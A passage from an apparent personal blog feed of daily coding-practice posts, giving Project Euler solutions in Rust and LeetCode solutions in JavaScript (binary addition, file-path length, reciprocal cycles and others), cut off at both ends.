</span><br><span class="line">63 99 </span><br><span class="line">64 37 </span><br><span class="line">65 99 </span><br><span class="line">66 99 </span><br><span class="line">67 99 </span><br><span class="line">68 99 </span><br><span class="line">69 99 </span><br><span class="line">70 99 </span><br><span class="line">71 99 </span><br><span class="line">72 99 </span><br><span class="line">73 99 </span><br><span class="line">74 99 </span><br><span class="line">75 99 </span><br><span class="line">76 99 </span><br><span class="line">77 99 </span><br><span class="line">78 99 </span><br><span class="line">79 99 </span><br><span class="line">80 99 </span><br><span class="line">81 41 </span><br><span class="line">82 99 </span><br><span class="line">83 99 </span><br><span class="line">84 99 </span><br><span class="line">85 99 </span><br><span class="line">86 99 </span><br><span class="line">87 99 </span><br><span class="line">88 99 </span><br><span class="line">89 99 </span><br><span class="line">90 99 </span><br><span class="line">91 99 </span><br><span class="line">92 99 </span><br><span class="line">93 99 </span><br><span class="line">94 99 </span><br><span class="line">95 99 </span><br><span class="line">96 99 </span><br><span class="line">97 99 </span><br><span class="line">98 99 </span><br><span class="line">99 99 </span><br><span class="line">100 50</span><br></pre></td></tr></table></figure><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_bigint;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> num_traits;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> num_bigint::BigInt;</span><br><span class="line"><span class="keyword">use</span> num_traits::pow;</span><br><span class="line"><span class="keyword">use</span> std::collections::HashSet;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> set = HashSet::new();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">2</span>..<span class="number">101</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">2</span>..<span class="number">101</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> base = BigInt::from(i);</span><br><span class="line">            set.insert(pow(base,j));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, set.len());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="709-To-Lower-Case"><a href="#709-To-Lower-Case" class="headerlink" title="709. To Lower Case"></a>709. To Lower Case</h3><p>Implement function ToLowerCase() that has a string parameter str, and returns the same string in lowercase.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;Hello&quot;</span><br><span class="line">Output: &quot;hello&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;here&quot;</span><br><span class="line">Output: &quot;here&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 3:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;LOVELY&quot;</span><br><span class="line">Output: &quot;lovely&quot;</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; str</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> toLowerCase = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.toLowerCase();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-17 Daily Challenge</title>
      <link href="/2019-01-17-Daily-Challenge/"/>
      <url>/2019-01-17-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Number spiral diagonals</em> in <em>Rust</em> and <em>Add Binary</em> in <em>JavaScript</em>.</p><p>BTW, I decided to the change style of problem section~</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Number-spiral-diagonals"><a href="#Number-spiral-diagonals" class="headerlink" title="Number spiral diagonals"></a>Number spiral diagonals</h3><h3 id="Problem-28"><a href="#Problem-28" class="headerlink" title="Problem 28"></a>Problem 28</h3><p>Starting with the number 1 and moving to the right in a clockwise direction a 5 by 5 spiral is formed as follows:</p><p><strong>21</strong> 22 23 24 <strong>25</strong><br>20  <strong>7</strong>  8  <strong>9</strong> 10<br>19  6  <strong>1</strong>  2 11<br>18  <strong>5</strong>  4  <strong>3</strong> 12<br><strong>17</strong> 16 15 14 <strong>13</strong></p><p>It can be verified that the sum of the numbers on the diagonals is 101.</p><p>What is the sum of the numbers on the diagonals in a 1001 by 1001 spiral formed in the same way?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>When you check the sequence 1, 3, 5, 7, 9, 13, 17, 21, 25, you will find that the numbers of sequence except the first one, others can be grouped by each four number.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i64</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp: <span class="built_in">i64</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1i64</span>..<span class="number">501i64</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> _j <span class="keyword">in</span> <span class="number">0</span>..<span class="number">4</span> &#123;</span><br><span class="line">            tmp += i*<span class="number">2</span>;</span><br><span class="line">            ans += tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="67-Add-Binary"><a href="#67-Add-Binary" class="headerlink" title="67. Add Binary"></a>67. Add Binary</h3><p>Given two binary strings, return their sum (also a binary string).</p><p>The input strings are both <strong>non-empty</strong> and contains only characters <code>1</code> or <code>0</code>.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: a = &quot;11&quot;, b = &quot;1&quot;</span><br><span class="line">Output: &quot;100&quot;</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: a = &quot;1010&quot;, b = &quot;1011&quot;</span><br><span class="line">Output: &quot;10101&quot;</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Because of large input, naive implementation will fail.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><p>Failed implementation:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; a</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; b</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> addBinary = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">parseInt</span>(a,<span class="number">2</span>)+<span class="built_in">parseInt</span>(b,<span class="number">2</span>)).toString(<span class="number">2</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Successful submission:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; a</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; b</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> addBinary = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (BigInt(<span class="string">"0b"</span>+a)+BigInt(<span class="string">"0b"</span>+b)).toString(<span class="number">2</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>If I want to be more efficient, I should write a function do string binary add.</p>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-16 Daily Challenge</title>
      <link href="/2019-01-16-Daily-Challenge/"/>
      <url>/2019-01-16-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Quadratic primes</em> in <em>Rust</em> and <em>Longest Absolute File Path</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Quadratic primes</span><br><span class="line"></span><br><span class="line">Problem 27 </span><br><span class="line"></span><br><span class="line">Euler discovered the remarkable quadratic formula:</span><br><span class="line"></span><br><span class="line">n……2+n+41</span><br><span class="line">It turns out that the formula will produce 40 primes for the consecutive integer values 0≤n≤39. However, when n=40,40^2+40+41=40(40+1)+41 is divisible by 41, and certainly when n=41,41^2+41+41 is clearly divisible by 41.</span><br><span class="line"></span><br><span class="line">The incredible formula n^2−79n+1601 was discovered, which produces 80 primes for the consecutive values 0≤n≤79. The product of the coefficients, −79 and 1601, is −126479.</span><br><span class="line"></span><br><span class="line">Considering quadratics of the form:</span><br><span class="line"></span><br><span class="line">n^2+an+b, where |a|&lt;1000 and |b|≤1000</span><br><span class="line"></span><br><span class="line">where |n| is the modulus/absolute value of n</span><br><span class="line">e.g. |11|=11 and |−4|=4</span><br><span class="line">Find the product of the coefficients, a and b, for the quadratic expression that produces the maximum number of primes for consecutive values of n, starting with n=0.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Because n start from zero, so b must be a prime.</p><p>Because maximum number of primes for consecutive values must be greater than one, so when n equals one, the expression will be a prime, which means $1 + a + b$ is prime, when $b$ equals two, $a$ must be even, otherwise $a$ must be odd. But I don&#39;t want to do it.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> primal::Sieve;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve = Sieve::new(<span class="number">2_000_000</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ansa = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ansb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ansc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> count = sieve.prime_pi(<span class="number">1000</span>) + <span class="number">1usize</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> -<span class="number">999i32</span>..<span class="number">1000</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1</span>..count &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut</span> tmpc = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">loop</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> tmp = tmpc * tmpc + i * tmpc + (sieve.nth_prime(j) <span class="keyword">as</span> <span class="built_in">i32</span>);</span><br><span class="line">                <span class="keyword">if</span> tmp &lt; <span class="number">0</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> !sieve.is_prime(tmp <span class="keyword">as</span> <span class="built_in">usize</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                tmpc += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> tmpc &gt; ansc &#123;</span><br><span class="line">                ansa = i;</span><br><span class="line">                ansb = sieve.nth_prime(j);</span><br><span class="line">                ansc = tmpc;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;, &#123;&#125;, &#123;&#125;"</span>, ansa, ansb, ansc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Alogorithm"><a href="#Alogorithm" class="headerlink" title="Alogorithm"></a>Alogorithm</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">388. Longest Absolute File Path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Suppose we abstract our file system by a string in the following manner:</span><br><span class="line"></span><br><span class="line">The string &quot;dir\n\tsubdir1\n\tsubdir2\n\t\tfile.ext&quot; represents:</span><br><span class="line"></span><br><span class="line">dir</span><br><span class="line">    subdir1</span><br><span class="line">    subdir2</span><br><span class="line">        file.ext</span><br><span class="line">The directory dir contains an empty sub-directory subdir1 and a sub-directory subdir2 containing a file file.ext.</span><br><span class="line"></span><br><span class="line">The string &quot;dir\n\tsubdir1\n\t\tfile1.ext\n\t\tsubsubdir1\n\tsubdir2\n\t\tsubsubdir2\n\t\t\tfile2.ext&quot; represents:</span><br><span class="line"></span><br><span class="line">dir</span><br><span class="line">    subdir1</span><br><span class="line">        file1.ext</span><br><span class="line">        subsubdir1</span><br><span class="line">    subdir2</span><br><span class="line">        subsubdir2</span><br><span class="line">            file2.ext</span><br><span class="line">The directory dir contains two sub-directories subdir1 and subdir2. subdir1 contains a file file1.ext and an empty second-level sub-directory subsubdir1. subdir2 contains a second-level sub-directory subsubdir2 containing a file file2.ext.</span><br><span class="line"></span><br><span class="line">We are interested in finding the longest (number of characters) absolute path to a file within our file system. For example, in the second example above, the longest absolute path is &quot;dir/subdir2/subsubdir2/file2.ext&quot;, and its length is 32 (not including the double quotes).</span><br><span class="line"></span><br><span class="line">Given a string representing the file system in the above format, return the length of the longest absolute path to file in the abstracted file system. If there is no file in the system, return 0.</span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line">The name of a file contains at least a . and an extension.</span><br><span class="line">The name of a directory or sub-directory will not contain a ..</span><br><span class="line">Time complexity required: O(n) where n is the size of the input string.</span><br><span class="line"></span><br><span class="line">Notice that a/aa/aaa/file1.txt is not the longest file path, if there is another path aaaaaaaaaaaaaaaaaaaaa/sth.png.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>This problem looks like real world problem happens on Windows.</p><p>Solution is quite clear so I don&#39;t want to explain it.</p><p>The point is that when you come cross one file, you can know its ancestor directories&#39;s length.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; input</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> lengthLongestPath = <span class="function"><span class="keyword">function</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> sumArr = [];</span><br><span class="line">  <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> countTab = <span class="function">(<span class="params">str</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.length; ++i)&#123;</span><br><span class="line">      <span class="keyword">if</span>(str[i] !== <span class="string">"\t"</span>) <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> str <span class="keyword">of</span> input.split(<span class="string">'\n'</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(str.includes(<span class="string">"."</span>))&#123;</span><br><span class="line">      <span class="keyword">let</span> pos = countTab(str);</span><br><span class="line">      ans = <span class="built_in">Math</span>.max(ans, pos?str.length - pos + sumArr[pos - <span class="number">1</span>]:str.length);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">let</span> pos = countTab(str);</span><br><span class="line">      sumArr[pos] = pos?sumArr[pos - <span class="number">1</span>] + str.length - pos + <span class="number">1</span>:str.length+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(lengthLongestPath("dir\n\tsubdir1\n\tsubdir2\n\t\tfile.ext"));</span></span><br><span class="line"><span class="comment">// console.log(lengthLongestPath("dir\n\tsubdir1\n\t\tfile1.ext\n\t\tsubsubdir1\n\tsubdir2\n\t\tsubsubdir2\n\t\t\tfile2.ext"));</span></span><br><span class="line"><span class="comment">// console.log(lengthLongestPath("asdf.asdf"));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-01-15 Daily Challenge</title>
      <link href="/2019-01-15-Daily-Challenge/"/>
      <url>/2019-01-15-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Reciprocal cycles</em> in <em>Rust</em> and <em>Open the Lock</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Reciprocal cycles</span><br><span class="line"></span><br><span class="line">Problem 26 </span><br><span class="line"></span><br><span class="line">A unit fraction contains 1 in the numerator. The decimal representation of the unit fractions with denominators 2 to 10 are given:</span><br><span class="line"></span><br><span class="line">1/2= 0.5</span><br><span class="line">1/3= 0.(3)</span><br><span class="line">1/4= 0.25</span><br><span class="line">1/5= 0.2</span><br><span class="line">1/6= 0.1(6)</span><br><span class="line">1/7= 0.(142857)</span><br><span class="line">1/8= 0.125</span><br><span class="line">1/9= 0.(1)</span><br><span class="line">1/10= 0.1</span><br><span class="line">Where 0.1(6) means 0.166666..., and has a 1-digit recurring cycle. It can be seen that 1/7 has a 6-digit recurring cycle.</span><br><span class="line"></span><br><span class="line">Find the value of d &lt; 1000 for which 1/d contains the longest recurring cycle in its decimal fraction part.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I use a very simple way to simulate it, check the code for more detail.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> map = HashMap::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ansi = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">1000</span> &#123;</span><br><span class="line">        map.clear();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">loop</span> &#123;</span><br><span class="line">            <span class="comment">// println!("&#123;&#125;, &#123;&#125;, &#123;&#125;",res, i, res % i);</span></span><br><span class="line">            res = res % i;</span><br><span class="line">            <span class="keyword">if</span> res == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="comment">// println!("WTF");</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> map.contains_key(&amp;res) &#123;</span><br><span class="line">                <span class="keyword">let</span> tmp: <span class="built_in">i32</span> = cnt - *map.get(&amp;res).unwrap();</span><br><span class="line">                <span class="comment">// println!("&#123;&#125;, &#123;&#125;, &#123;&#125;",res,i,tmp);</span></span><br><span class="line">                <span class="keyword">if</span> tmp &gt; ans &#123;</span><br><span class="line">                    ans = tmp;</span><br><span class="line">                    ansi = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            map.insert(res, cnt);</span><br><span class="line">            res *= <span class="number">10</span>;</span><br><span class="line">            cnt += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;, recurring cycle is &#123;&#125;-digit."</span>, ansi, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">752. Open the Lock</span><br><span class="line"></span><br><span class="line">You have a lock in front of you with 4 circular wheels. Each wheel has 10 slots: &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;. The wheels can rotate freely and wrap around: for example we can turn &apos;9&apos; to be &apos;0&apos;, or &apos;0&apos; to be &apos;9&apos;. Each move consists of turning one wheel one slot.</span><br><span class="line"></span><br><span class="line">The lock initially starts at &apos;0000&apos;, a string representing the state of the 4 